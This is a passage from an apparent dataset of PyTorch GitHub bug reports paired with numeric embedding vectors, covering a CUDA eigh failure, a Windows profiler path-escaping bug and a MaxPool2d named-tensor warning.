  5.06634191e-02  2.61583060e-01  2.07351267e-01  4.31920290e-01
  8.12863037e-02  1.48943409e-01 -6.08515859e-01 -9.16811079e-02
 -4.22048330e-01  3.11187357e-01 -2.73634017e-01  1.30819425e-01
 -8.43989998e-02 -1.10555977e-01  2.97202468e-01 -3.25604200e-01
 -4.14418690e-02 -2.70262957e-01 -2.46301740e-01  2.05049396e-01
 -7.24540949e-02  3.20519865e-01  3.77091944e-01  2.24940702e-01
  1.57098576e-01  1.67407263e-02  1.80985987e-01 -8.60995799e-02
 -5.79054542e-02 -1.47630140e-01 -2.61166692e-01 -2.65232980e-01
  1.93021446e-01 -3.34031731e-02  1.48219511e-01  4.75339331e-02
  1.42768472e-01 -1.19945601e-01 -7.84742683e-02 -1.23919576e-01
  2.30517089e-01 -1.54604129e-02 -1.97484940e-02  8.43599215e-02
 -1.08680159e-01 -5.32119945e-02 -3.11256945e-01 -3.54768515e-01
 -2.04874024e-01  4.94150445e-05  2.06213713e-01  1.01008667e-02
 -6.15417324e-02 -1.18498042e-01 -1.72391549e-01  3.40212047e-01
 -5.20015508e-03 -3.99154648e-02  1.72057599e-01  2.83473074e-01
  1.61235496e-01  1.08551234e-03  2.56044209e-01 -2.54565835e-01
 -7.30460882e-02 -1.23395637e-01  7.45970309e-02  9.76770818e-02
 -1.78084910e-01 -4.29625288e-02 -4.47427034e-02 -2.88200080e-01
  1.80100933e-01 -1.05997071e-01  1.07402548e-01  5.50134405e-02
  1.51760057e-01 -6.09281175e-02  1.78847983e-01 -1.06051609e-01
 -1.29198447e-01 -2.51364291e-01  3.75556856e-01  3.69887725e-02
 -1.93205804e-01  4.45633620e-01 -2.79862642e-01 -1.15466520e-01
 -2.16411754e-01  2.79870689e-01 -1.70274645e-01  4.08923961e-02
 -8.72749686e-02 -4.77503017e-02  1.47461891e-01 -1.62151396e-01
  1.32480472e-01 -7.15467483e-02  9.78916138e-02 -2.34267190e-01
  2.55783916e-01  1.92217693e-01  8.68908241e-02  4.75079566e-01
  3.29861283e-01  4.41986918e-02 -2.30791211e-01 -5.35186604e-02
 -3.66667211e-01  8.94461423e-02  5.79780154e-02  3.20430323e-02
  4.53281283e-01  9.45789739e-02  1.94540352e-01 -2.51103908e-01
  2.49309361e-01 -4.30917263e-01 -5.75475171e-02 -1.74337655e-01
  1.76926330e-01  3.72323245e-01 -3.82355601e-02  4.42527562e-01
  2.35000253e-01 -4.30634737e-01  1.46162823e-01 -5.06979823e-01
 -2.00746596e-01 -5.08124903e-02 -1.99487045e-01 -2.45980024e-01
  5.25841296e-01 -1.50871217e-01  6.96677342e-02  6.94199279e-02
  2.52383858e-01  6.58212006e-02  7.36614242e-02 -1.40969366e-01
 -5.09856269e-02  1.94366485e-01  3.37306023e-01 -5.08033156e-01
  1.04490630e-02 -1.67273521e-01  6.39871210e-02  1.74098700e-01
  4.36402440e-01 -4.62199956e-01  2.50626743e-01 -1.39246628e-01
 -1.10842854e-01  1.51081175e-01 -9.97009128e-02  9.92480814e-02
 -1.85535863e-01  5.13215303e-01  3.11826855e-01  8.13399479e-02
 -4.08427417e-03 -1.20229051e-01 -4.57997978e-01  6.78355545e-02
  4.12886869e-03  1.59616157e-01 -2.74520457e-01  1.01969421e-01
  8.64798278e-02  1.38346970e-01  2.78366715e-01  1.06564105e-01
  1.78066880e-01  1.65432677e-01 -3.10290873e-01 -1.94414154e-01
 -1.90519512e-01  1.61124498e-01 -1.32104056e-02 -2.98802674e-01
 -3.13549697e-01 -1.72335058e-01 -6.30915686e-02 -2.27023259e-01
 -2.74124201e-02 -1.56724840e-01  2.20537171e-01  1.52371943e-01
  2.82417536e-01  2.72082929e-02 -4.08020526e-01  1.10615857e-01
  5.48567958e-02  1.86893851e-01 -2.25166589e-01  4.19112623e-01
 -3.71352792e-01  1.00286782e-01  2.72050917e-01  1.29569054e-01
  1.08864918e-01  1.22403651e-01 -4.01322007e-01 -1.11414149e-01
 -2.30515495e-01 -1.38706893e-01  1.62666798e-01 -1.74345344e-01
  1.15807712e-01  5.08432031e-01 -1.28534645e-01 -1.38083883e-02
 -1.42142521e-02  1.46670833e-01  2.75596321e-01 -2.19712302e-01
  2.23709166e-01 -3.61043334e-01 -1.80769771e-01  7.39598945e-02
  2.99374647e-02 -1.24871179e-01 -1.51331455e-01 -2.13269204e-01]"
[Bug] linalg.eigh fails if device not set high priority triage review module: cuda triaged module: linear algebra,"## ðŸ› Bug

`torch.linalg.eigh` fails on the gpu if device not set beforehand (thanks @ngimel for the fix). 

## To Reproduce

```python
import torch
torch.__version__
# nightly 1.10

# fix is next line
# torch.cuda.set_device(""cuda:1"")
device = torch.device(""cuda:1"")

a = torch.randn(20, 50)
b = a @ a.t() + 1e-3 * torch.eye(20)
b = b.to(device)
torch.linalg.eigh(b)
```
results in 
```
RuntimeError: cusolver error: CUSOLVER_STATUS_INTERNAL_ERROR, when calling `cusolverDnXsyevd( handle, params, jobz, uplo, n, CUDA_R_32F, reinterpret_cast<void*>(A), lda, CUDA_R_32F, reinterpret_cast<void*>(W), CUDA_R_32F, reinterpret_cast<void*>(bufferOnDevice), workspaceInBytesOnDevice, reinterpret_cast<void*>(bufferOnHost), workspaceInBytesOnHost, info)`

```


## Expected behavior

this should work, and works when device is set.

## Environment
```
PyTorch version: 1.10.0.dev20210628
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.4 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.10.2
Libc version: glibc-2.27

Python version: 3.8.10 (default, Jun  4 2021, 15:09:15)  [GCC 7.5.0] (64-bit runtime)
Python platform: Linux-4.15.0-99-generic-x86_64-with-glibc2.17
Is CUDA available: True
CUDA runtime version: 11.3.58
GPU models and configuration: 
GPU 0: NVIDIA TITAN RTX
GPU 1: NVIDIA TITAN RTX
GPU 2: NVIDIA TITAN RTX
GPU 3: NVIDIA TITAN RTX
GPU 4: NVIDIA TITAN RTX
GPU 5: NVIDIA TITAN RTX
GPU 6: NVIDIA TITAN RTX
GPU 7: NVIDIA TITAN RTX

Nvidia driver version: 465.19.01
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] gpytorch==1.5.0
[pip3] numpy==1.20.2
[pip3] torch==1.10.0.dev20210628
[pip3] torchaudio==0.10.0a0+abaa088
[pip3] torchvision==0.11.0.dev20210628
[conda] blas                      1.0                         mkl  
[conda] cudatoolkit               11.1.74              h6bb024c_0    nvidia
[conda] gpytorch                  1.5.0                     dev_0    <develop>
[conda] mkl                       2021.2.0           h06a4308_296  
[conda] mkl-service               2.3.0            py38h27cfd23_1  
[conda] mkl_fft                   1.3.0            py38h42c9631_2  
[conda] mkl_random                1.2.1            py38ha9443f7_2  
[conda] numpy                     1.20.2           py38h2d18471_0  
[conda] numpy-base                1.20.2           py38hfae3a4d_0  
[conda] pytorch                   1.10.0.dev20210628 py3.8_cuda11.1_cudnn8.0.5_0    pytorch-nightly
[conda] torchaudio                0.10.0.dev20210628            py38    pytorch-nightly
[conda] torchvision               0.11.0.dev20210628      py38_cu111    pytorch-nightly
```


## Additional context

seemingly breaks some gpytorch linear algebra. 


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @ngimel @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk @xwang233 @Lezcano",True,"[-0.34247756 -0.05473846 -0.1440314  -0.09149692 -0.19600408 -0.21775979
 -0.13069573  0.0990724  -0.13617471 -0.19796541  0.01674938  0.06941076
 -0.20359191  0.03681455 -0.04186939 -0.08171031 -0.17686537 -0.02404076
 -0.11410213 -0.05717961  0.3531862  -0.03805972 -0.40507734 -0.06998669
  0.01902436  0.0595614  -0.13701743 -0.10874121  0.27071837  0.07511715
  0.06070973 -0.02500561 -0.5218502   0.1196866   0.07686277 -0.07853742
 -0.56579196 -0.25986555 -0.19765992 -0.13050073  0.11520085 -0.00777314
 -0.12901512  0.08412977 -0.12995043 -0.03049745 -0.07928226  0.18764323
 -0.20908505 -0.15816762 -0.07905588  0.3025212   0.03568389 -0.02292187
  0.11950842 -0.254097    0.06197742  0.1259277   0.16123345 -0.3587304
  0.22727999 -0.02742938 -0.20253131 -0.20219654 -0.1022377   0.09583036
 -0.05568288  0.1818078   0.5558338  -0.0616372   0.14472485  0.00867514
 -0.07021381 -0.17443135 -0.05921651  0.12298732 -0.24638532  0.17741138
 -0.33477345  0.0011025   0.16404177  0.10226984 -0.0257858  -0.11651593
  0.40157133  0.01244333  0.13654146  0.0746465   0.15194121 -0.06248947
  0.26903403  0.1344662   0.20805553  0.3269769  -0.03726094  0.21023338
  0.05529536 -0.4308414  -0.5264336  -0.27782363 -0.25149646 -0.4515469
 -0.08703658  0.8370083  -0.02585112 -0.11938353  0.02157713  0.23067665
 -0.10752815 -0.22187808  0.3441893   0.09860353 -0.00416344 -0.01297874
 -0.02870925 -0.01026237 -0.5214774  -0.18385273  0.01781683  0.05509072
  0.02145957  0.2149157   0.11263382  0.29846132  0.45137614  0.19701332
  0.2323794  -0.06863197 -0.22229528  0.11809453 -0.00378918 -0.11550494
  0.12205204 -0.13163471  0.205257    0.5029739  -0.3290471  -0.19015847
 -0.03503861 -0.02944723 -0.18831474  0.16388981  0.09007061 -0.2362031
  0.4236399   0.15600607 -0.06759351  0.03156753  0.14268315  0.02960651
  0.18152149 -0.22618163 -0.47493476  0.49848434  0.07026707  0.0143953
  0.12282475  0.1267964   0.30964288 -0.38268456  0.27014294  0.3061199
  0.2774452   0.29643443  0.03331309  0.16171025 -0.32254076 -0.09434956
 -0.40616488  0.22638805 -0.00665413 -0.21063882  0.04002514 -0.17396146
 -0.11396091 -0.30879566 -0.14317062 -0.4104668   0.01334238  0.46369132
  0.07158562  0.6434083   0.5315559   0.13162573  0.3598982   0.1812833
  0.47438747 -0.14107539 -0.14636466 -0.27095526 -0.34297353 -0.4141139
  0.20323104 -0.13887396 -0.09190477  0.11874115  0.11200361 -0.1244842
 -0.19556546 -0.20827186 -0.14853147  0.15331626  0.07807989 -0.001762
  0.01791144  0.09824872 -0.52613264 -0.45201403 -0.2841551  -0.01434816
 -0.15712076 -0.32885292  0.00563507 -0.25634712 -0.03387988  0.12356164
 -0.2896997   0.0280678   0.1031542   0.38847673  0.3739701   0.22205414
  0.12882799 -0.11321516  0.08813602  0.00448336  0.09373724 -0.1423603
  0.18203473  0.01217341 -0.15506548 -0.42820275  0.04148564  0.17021042
 -0.15093973  0.234371   -0.04351968 -0.23736712  0.03170668  0.0783755
  0.00364769 -0.06578355  0.11921549 -0.02936654  0.05773839  0.33729586
 -0.20486686 -0.08704691 -0.25646535 -0.07599824  0.19506884 -0.02882261
 -0.24799034 -0.30487365  0.313942   -0.07600777  0.24867311 -0.00807447
  0.03061649 -0.04025999  0.36247736  0.3628312  -0.19298682  0.2965417
  0.49080533  0.18766901 -0.20381582  0.17320842 -0.212978   -0.0445118
  0.15516543 -0.28906757  0.5130731  -0.00440351  0.23042509 -0.24670076
  0.46881965 -0.01164037  0.20699206 -0.14221983  0.46444228  0.12580666
 -0.08564638  0.19889352  0.5139832  -0.3931619  -0.14797312 -0.2723511
 -0.12412612 -0.2688193  -0.25585234  0.11087459  0.29189944 -0.17036727
 -0.40931207  0.20660233  0.2515706   0.02819366  0.08380855 -0.14381006
 -0.4183596   0.07601419  0.1738772  -0.39371902 -0.2640121  -0.2741234
  0.03384966  0.16917908  0.44934517 -0.47941473  0.32830408 -0.06798945
 -0.10231187  0.16849956 -0.19179529  0.3596734   0.09227128  0.35228303
  0.26071027  0.09374867 -0.03564639 -0.183344   -0.37818295 -0.10700194
 -0.11088528 -0.00627437 -0.29186645  0.26055384 -0.11238572  0.11885571
  0.06871521  0.18430045  0.36755776  0.21671093 -0.54080987 -0.13667274
 -0.00610326  0.10540646  0.14630118 -0.40426654 -0.20682794 -0.12079947
  0.02803464 -0.27050376 -0.37691677 -0.1688285   0.40167364  0.40605333
  0.19097146 -0.0604936  -0.20002064 -0.15319084  0.1572429   0.2782613
 -0.09728292  0.35557193  0.09161445  0.10809527  0.45879364  0.04720854
  0.03030855  0.14976935 -0.39522237 -0.15700471 -0.03098145  0.03478394
  0.13367008 -0.18580116 -0.0761628   0.57839376 -0.35446408  0.17144404
 -0.01046224 -0.14325392  0.40292054 -0.17127407 -0.02623907 -0.14410156
  0.18383062 -0.11181146  0.10996969 -0.2213615  -0.12005371 -0.03902022]"
Pytorch 1.9 Profiler generate invalid separator path inside JSON using tensorboard_trace_handler. high priority module: windows triaged oncall: profiler,"## ðŸ› Bug

On windows, tensorboard_trace_handler use the separador \  in the file path instead of / or \\\ breaking the json file.


## To Reproduce

Steps to reproduce the behavior:

1. Setup the Profiler. Example:
`with torch.profiler.profile(
    activities=[
        torch.profiler.ProfilerActivity.CPU,
        torch.profiler.ProfilerActivity.CUDA],
    schedule=torch.profiler.schedule(
        wait=2,
        warmup=3,
        active=6),
    on_trace_ready=torch.profiler.tensorboard_trace_handler('./result', worker_name='worker0'),
    record_shapes=True,
    profile_memory=True,
    with_stack=True
  ) as p:`

2. Use Kineto to try to profile the file `tensorboard --logdir=./result`
3. It throw the error on windows: `json.decoder.JSONDecodeError: Invalid \escape: line 12 column 64 (char 371)`


## Expected behavior

To escape the separator correctly on the json file. Ex: \\\

## Environment

```
PyTorch version: 1.9.0+cu111
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Microsoft Windows 10 Home Single Language
GCC version: Could not collect
Clang version: Could not collect
CMake version: Could not collect
Libc version: N/A

Python version: 3.9 (64-bit runtime)
Python platform: Windows-10-10.0.19041-SP0
Is CUDA available: False
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.3
[pip3] pytorch-lightning==1.3.5
[pip3] torch==1.9.0+cu111
[pip3] torch-tb-profiler==0.2.0
[pip3] torchaudio==0.9.0
[pip3] torchmetrics==0.3.2
[pip3] torchvision==0.10.0+cu111
[conda] Could not collect
```



cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @ilia-cher @gdankel @ngimel @nbcsm @guotuofeng @guyang3532 @gaoteng-git @peterjc123 @mszhanyi @skyline75489",True,"[-4.09749895e-03 -1.85122445e-01 -4.60561402e-02  1.10322282e-01
  3.81942034e-01 -1.08424127e-01 -2.23370686e-01 -4.40554880e-02
 -3.96180153e-01 -9.12172571e-02  2.79670507e-01 -3.95423889e-01
 -2.48422436e-02  1.01013340e-01  9.52554047e-02  3.52920026e-01
 -2.17147067e-01  2.88767256e-02  1.02880538e-01 -2.60967076e-01
  3.17630917e-02 -5.95012344e-02  9.56964344e-02 -1.31241426e-01
 -3.05776656e-01 -7.15026110e-02 -9.60382819e-02 -4.51738507e-01
  4.12244081e-01  1.53742442e-02  5.47241271e-02 -4.17903185e-01
 -2.35694125e-01 -4.39081639e-02  2.71314293e-01  1.89633891e-01
 -8.98927599e-02  8.29704851e-03 -1.56689376e-01  5.71532995e-02
  2.46480525e-01  5.15792593e-02 -1.52228475e-01 -5.31680174e-02
 -3.10773253e-01 -2.12907135e-01 -7.18479156e-02  6.61999732e-02
 -5.22103310e-01  1.46004176e-02 -2.70927131e-01  4.08045128e-02
 -3.97224814e-01 -7.19318315e-02 -3.36324386e-02  2.35286653e-01
 -9.68197435e-02  4.79712486e-02 -1.70845941e-01 -1.44423738e-01
 -1.74542338e-01 -2.45871134e-02 -4.61128414e-01 -2.10907310e-02
  1.93991680e-02  2.72491664e-01 -2.05154195e-02  1.55752957e-01
  3.96550179e-01  1.10148415e-02  2.13862568e-01 -2.04790026e-01
 -2.60416180e-01 -1.22709602e-01  1.12814352e-01  1.78704530e-01
 -3.36777627e-01  3.48766208e-01  2.05439538e-01 -2.91905701e-01
 -5.62321544e-02 -7.15588853e-02  1.53954744e-01  1.10307708e-01
  3.98964919e-02 -7.08959997e-04  4.19947729e-02 -1.93008021e-01
  2.16517180e-01  1.13120466e-01  3.45603585e-01 -1.89831391e-01
  3.75289381e-01  2.87606984e-01  7.55245015e-02  3.28401655e-01
 -3.45781296e-01  9.67183858e-02  2.20322415e-01 -2.12087005e-01
 -1.39027998e-01 -3.23936582e-01 -2.51098037e-01  5.95166206e-01
  5.20350300e-02 -9.52769816e-02  1.07976884e-01  3.21522951e-01
  2.61755943e-01  7.54126683e-02  1.86238229e-01  4.99482974e-02
 -2.27944329e-01 -1.11493893e-01  3.08930278e-01  6.52443916e-02
  5.24649024e-02  5.63420691e-02  1.16652809e-01  2.48981386e-01
  2.69974411e-01 -2.11818889e-01  1.82834059e-01  7.73900449e-02
  1.25633940e-01  5.86931370e-02 -3.20894644e-02  9.13704634e-02
  1.26691326e-01  2.25234747e-01  1.84765741e-01  5.32669909e-02
  2.95532703e-01 -3.43451798e-02  3.37704569e-01 -3.30738164e-02
 -3.05176407e-01 -1.90060511e-01 -2.23809212e-01 -1.84655428e-01
 -3.74098301e-01  1.91066295e-01 -1.30276382e-01  1.48366224e-02
  1.90681949e-01  3.90681803e-01 -3.65682155e-01  2.35901121e-02
  5.58165759e-02  2.30557442e-01 -1.04343146e-01  1.44402117e-01
  4.65710722e-02  4.46423918e-01  1.97287649e-01  3.30873072e-01
  5.97759634e-02 -8.52624252e-02  6.49366751e-02 -4.92282599e-01
 -6.48002103e-02  3.52934361e-01  2.21483439e-01  1.90350767e-02
  1.58019781e-01  6.51799962e-02 -1.95220113e-01 -1.35445148e-01
 -1.87347561e-01 -1.23150118e-01 -5.94251826e-02 -2.12415129e-01
 -2.07386523e-01 -2.41309375e-01  1.38069123e-01  7.28084743e-02
 -1.67501360e-01 -4.46931899e-01  1.79856978e-02  2.40586340e-01
  3.32918197e-01  3.27404737e-01 -7.95331299e-02 -2.76723623e-01
 -2.60904610e-01  1.35108501e-01  3.66152614e-01 -1.40154034e-01
  1.24616176e-01  2.04815656e-01  9.41477418e-02  1.39123350e-01
  6.08579159e-01 -1.77903563e-01  5.63604292e-04 -3.38818252e-01
 -6.51427209e-02  3.48499149e-01 -2.02739879e-01  2.48741761e-01
  1.95716068e-01 -1.01866305e-01 -8.47366676e-02 -7.67527744e-02
 -7.64474049e-02  1.40919209e-01 -4.03225690e-01 -1.00704633e-01
 -3.04249495e-01  1.42436773e-01 -1.94135308e-01 -5.22758245e-01
 -1.66985169e-01 -6.29124790e-02 -2.21988231e-01 -1.33986492e-02
 -1.46356151e-01  1.18764609e-01  3.68640363e-01  1.08231112e-01
 -1.24304727e-01  3.10362458e-01 -3.72790128e-01 -3.27491343e-01
  1.57623619e-01  9.95084196e-02  2.31321871e-01 -2.05076754e-01
 -1.05385378e-01  1.35364812e-02 -1.85505405e-01  3.03439677e-01
  3.39592457e-01  1.28909916e-01  1.57478210e-02 -7.01204687e-02
  1.02247391e-02 -1.28047168e-01  4.99361102e-03  1.60508499e-01
 -9.39545631e-02  2.95873046e-01 -2.13369057e-01 -3.12131464e-01
 -7.64892325e-02  1.29158080e-01 -3.32521290e-01 -7.56910909e-03
 -2.46257201e-01 -3.60138640e-02  1.91831440e-01 -1.04098663e-01
  2.64990479e-01  9.04692244e-03  1.47392124e-01  1.30209476e-01
 -1.92774147e-01 -3.83439541e-01  1.52556390e-01  1.21670082e-01
  7.40419105e-02  2.45438442e-01  1.39962971e-01  4.34244514e-01
  1.70007378e-01  3.53784561e-02 -2.00797260e-01  2.62751162e-01
  4.35425192e-02 -2.43856013e-01  2.76557982e-01 -6.37108088e-01
 -5.58179393e-02 -2.94693746e-03  2.55173564e-01  5.73441684e-02
  4.32756633e-01 -3.41392234e-02  2.03431025e-02  2.07781628e-01
  2.10024901e-02  3.90863836e-01 -1.70973122e-01  1.29279420e-01
  3.09456661e-02 -4.04574633e-01 -1.37586281e-01  9.29088332e-04
 -2.42398694e-01 -1.53431520e-01 -2.65597254e-01  1.71154141e-01
  2.10164547e-01 -1.05527550e-01 -4.02543664e-01 -5.77262416e-02
  1.87075749e-01  2.10195214e-01 -9.31425765e-02 -4.36696798e-01
 -3.06991041e-01 -6.14686497e-02  1.49684697e-01  8.79157037e-02
 -2.67871886e-01 -2.11163923e-01  3.32555860e-01 -9.48327482e-02
  4.26355541e-01 -4.34710264e-01  1.30700022e-01  2.96467662e-01
 -1.20215759e-01 -5.28720114e-03 -6.11792877e-02 -1.66652054e-01
 -2.54898936e-01  5.47098935e-01 -9.62243527e-02 -3.55441384e-02
 -6.29641488e-02 -1.22860655e-01 -1.07229054e-01  8.31150040e-02
  2.90879548e-01  5.12954354e-01 -1.27041385e-01  2.49085426e-02
 -1.82394296e-01  1.89033404e-01  5.78224659e-02  1.04288071e-01
 -1.83402091e-01  1.16273448e-01 -1.02632865e-01 -3.45330566e-01
 -3.01653087e-01  3.74184132e-01  6.57396242e-02 -2.11819172e-01
  1.52976692e-01 -1.30445927e-01  7.24954754e-02 -2.32589319e-01
 -1.22431338e-01 -8.57967958e-02  2.59398580e-01  3.67721081e-01
 -7.14417621e-02  1.40413195e-01  2.84358524e-02  2.28287011e-01
 -1.09901719e-01  8.47029965e-04  9.20711234e-02  4.01982456e-01
  2.50607412e-02 -2.03444958e-01 -1.18535779e-01  9.66149509e-01
  4.40487172e-03  2.86548257e-01 -5.02370410e-02 -1.16328731e-01
  3.91806737e-02 -6.96563423e-02 -1.79479897e-01 -1.79808468e-01
  3.16729546e-01  5.02898581e-02 -3.56397510e-01  1.12198174e-01
  1.40876532e-01  1.63992047e-01 -1.27201974e-01 -2.39661276e-01
  2.36069351e-01 -1.24425150e-01  1.15906298e-01  2.00074941e-01
  2.39028990e-01 -1.11808121e-01 -7.01002777e-02 -2.39369035e-01]"
Annoying warning with nn.MaxPool2d module: nn triaged module: named tensor,"Hi, thank you very much for pytorch 1.9!
I'm trying to update SpeechBrain (https://github.com/speechbrain/speechbrain) to support pytorch 1.9.
Everything seems to work, but I noticed an annoying warning when using  nn.MaxPool2d:

```
import torch
import torch.nn as nn

m = nn.MaxPool2d(3, stride=2)
m = nn.MaxPool2d((3, 2), stride=(2, 1))
input = torch.randn(20, 16, 50, 32)
output = m(input)
```

```
UserWarning: Named tensors and all their associated APIs are an experimental feature and subject to change. Please do not use them for anything important until they are released as stable. (Triggered internally at  /opt/conda/conda-bld/pytorch_1623448238472/work/c10/core/TensorImpl.h:1156.)
  return torch.max_pool2d(input, kernel_size, stride, padding, dilation, ceil_mode)
```

Note that it only appears when using nn.MaxPool2d (nn.MaxPool1d and  nn.AvgPool1d have no warning).
Any idea?



cc @zou3519 @albanD @mruberry @jbschlosser",True,"[-3.62258166e-01 -9.07722265e-02 -3.28132033e-01  1.15366299e-02
  5.26492298e-02 -1.61628649e-01  2.14778632e-01  5.92994057e-02
 -3.97304773e-01 -3.78528908e-02 -1.47455812e-01 -1.86054781e-02
 -2.81987637e-01  2.20117331e-01 -9.99691784e-02  1.95221558e-01
 -2.69052207e-01 -1.08500034e-01 -2.38557339e-01 -2.82448500e-01
  3.73669446e-01  1.79043874e-01  4.75661531e-02  2.91263126e-03
 -4.93619964e-02 -2.95064487e-02 -1.93440974e-01 -1.03532299e-01
  3.57263923e-01  2.19591081e-01  1.71596289e-01  7.02151358e-02
 -3.53982747e-01 -1.07907079e-01  7.16469362e-02  1.29815951e-01
 -1.19528919e-01 -2.27100492e-01 -1.56446755e-01 -8.15552101e-03
  1.35815382e-01  3.26067209e-01 -1.30736139e-02  1.26300961e-01
 -1.42870158e-01  1.47734389e-01 -1.26693361e-02  1.58882216e-01
 -1.03811599e-01 -8.58453941e-03  1.68346073e-02  6.52255118e-02
 -1.66319609e-01 -1.49752676e-01  2.79191941e-01 -1.71363175e-01
 -3.01214874e-01  2.31862873e-01  5.22510558e-02 -4.97831106e-01
  7.64020607e-02 -1.60998642e-01  6.02928586e-02  7.17323646e-02
  1.30727351e-01  1.28653109e-01 -1.29115805e-01 -1.60394847e-01
  2.28673577e-01  3.92459854e-02 -1.37284443e-01 -8.12883452e-02
 -6.21022023e-02 -6.48817942e-02  1.64515823e-01  3.05231839e-01
 -2.83967167e-01  2.34096497e-01 -2.07554754e-02 -1.26113981e-01
 -1.05831586e-02  7.32768029e-02  3.19923639e-01 -2.26736754e-01
  8.15950185e-02  1.05220601e-01  1.88770592e-01  6.57568648e-02
  4.05385286e-01 -6.20134398e-02  3.74888539e-01 -9.19087678e-02
  8.85377154e-02  3.02111566e-01  7.77745470e-02 -3.25766653e-02
  7.90205002e-02 -5.07242978e-03 -5.68624973e-01 -4.11722660e-01
 -3.65071557e-02 -5.90076983e-01 -2.62316197e-01  4.30247158e-01
  1.54767185e-01  8.22180659e-02  1.49779767e-01  1.73587590e-01
  4.08106625e-01  9.30570718e-03  3.22129339e-01  7.05879033e-02
  1.55004010e-01  2.43092686e-01  7.25799948e-02  2.14307413e-01
 -2.04809904e-01  1.25650376e-01 -1.96873009e-01  6.37804627e-01
 -1.34734035e-01 -2.41721366e-02 -6.13352470e-02  1.97007716e-01
  6.11213595e-02  3.64026904e-01 -1.01432219e-01 -3.32948938e-02
  1.38005733e-01  3.21793556e-01  1.59190863e-01  6.52818307e-02
 -1.27507970e-01  1.42244548e-02  1.46794170e-01  7.35724047e-02
 -4.70618904e-02 -2.47459128e-01 -1.08981833e-01 -2.54852138e-02
 -1.93035640e-02  1.74194038e-01 -4.54768240e-01 -3.41985703e-01
 -9.97687802e-02 -1.30521446e-01 -3.65347803e-01  4.64377142e-02
 -7.05907494e-02  2.27234364e-01 -6.21877536e-02  8.47808123e-02
 -4.24913466e-01  4.94542629e-01  7.49762282e-02  1.35486841e-01
  2.65483409e-01 -7.67436773e-02  1.89544797e-01 -4.61833894e-01
  2.62396812e-01  2.55885452e-01  8.20654333e-02  5.45337796e-02
  1.71027839e-01  9.81334411e-03 -3.84454161e-01 -1.88930571e-01
 -6.15834236e-01 -3.75904217e-02 -1.78384006e-01 -2.57251542e-02
 -1.32727414e-01 -2.60775506e-01  2.43885159e-01 -1.52975619e-01
 -1.05964430e-01 -5.47448397e-01 -2.48694122e-01  3.94056052e-01
  8.62354934e-02  4.63877678e-01  3.46661210e-01 -2.22507119e-01
 -2.03096777e-01  4.00357544e-01  7.83964843e-02 -8.93949345e-02
 -4.02003974e-02  2.10628659e-03 -7.73615390e-03 -5.04719466e-02
  2.17534289e-01  9.18064192e-02  3.49662751e-02  1.10643551e-01
  1.41092181e-01 -2.83430845e-01  2.53945410e-01 -1.24143220e-01
  2.92779803e-01  2.14988947e-01  3.75222974e-03  6.54232651e-02
  1.99498028e-01 -2.34479100e-01 -3.58763725e-01 -3.44388366e-01
 -3.97418976e-01 -3.42377797e-02 -1.83411643e-01 -1.06563501e-01
 -2.12878346e-01 -3.77424300e-01 -1.31100982e-01  1.42707646e-01
  1.22695789e-01  1.79554597e-02 -2.57940609e-02  2.07991049e-01
  1.21521369e-01 -9.90992039e-02 -2.01047853e-01 -2.19848454e-01
  5.62515110e-04 -1.72896944e-02 -2.51302153e-01 -6.63830340e-02
 -3.34954143e-01  2.18463242e-01 -5.46089299e-02 -2.90724412e-02
  2.97698081e-01 -2.23453417e-01  1.50895968e-01  3.75521541e-01
 -1.18601263e-01  2.14010477e-02  6.03263527e-02  2.78360307e-01
 -2.42746383e-01  8.78950134e-02 -2.39818711e-02 -4.76933196e-02
 -2.19709411e-01 -6.44791871e-03 -6.20791972e-01 -8.58732872e-03
 -2.87769139e-01  2.36169159e-01  2.32206285e-01 -2.24531218e-01
 -2.02065498e-01 -8.40782225e-02  2.48109609e-01  2.12052688e-01
 -9.18954909e-02 -6.21658470e-03  1.08869664e-01 -1.01707585e-01
  2.78096288e-01  1.77801773e-01 -2.45644629e-01  3.87125194e-01
  7.27553666e-02 -6.41552284e-02 -7.62446746e-02  4.44264680e-01
 -1.08186910e-02 -1.44418076e-01 -5.06136529e-02 -5.37477911e-01
  1.83782622e-01  1.42928064e-01  7.27551356e-02 -1.98150218e-01
  5.05039811e-01 -6.91225082e-02 -2.80627131e-01 -1.49534494e-01
  2.31809467e-01  3.93469870e-01  6.26197308e-02  3.38101685e-01
  2.28848875e-01 -1.33783847e-01 -5.74902296e-02 -3.40742826e-01
 -1.99351832e-01 -3.41282487e-02 -1.01560712e-01  2.28917032e-01
  7.52464473e-01  1.37297302e-01 -2.19617769e-01  2.54138172e-01
  2.46654406e-01 -2.55967937e-02 -2.05962043e-02  1.15196064e-01
  9.37805474e-02  4.16870058e-01  1.51505306e-01 -4.18949068e-01
 -1.67825416e-01 -1.45738795e-02 -4.46530804e-02 -1.56870753e-01
  4.05217588e-01 -4.14839774e-01  6.76816821e-01  2.26176441e-01
 -1.95915580e-01  2.87580580e-01 -4.72338870e-04  2.24283084e-01
 -2.26880908e-01  3.18367600e-01  3.31139863e-01  8.02335665e-02
 -3.34805697e-02 -2.12891504e-01 -4.72991526e-01  4.68600392e-02
  1.86361283e-01  2.35899344e-01 -4.32231069e-01 -8.70377943e-03
 -2.83236206e-01  3.36955041e-02  2.45016694e-01 -1.87386245e-01
 -2.18248367e-02 -1.69277713e-02 -8.57026279e-02 -1.34271801e-01
 -1.92740232e-01  3.84055376e-01 -7.69424289e-02 -4.10317421e-01
 -1.61963657e-01 -9.65728164e-02  2.21656710e-01 -4.09828752e-01
 -2.69079924e-01 -3.95721555e-01  4.97559130e-01  1.08933896e-01
 -1.99587166e-01 -2.30331287e-01 -9.12846625e-02  2.72208184e-01
 -3.14937592e-01  4.83581051e-02  4.85216565e-02  6.11992300e-01
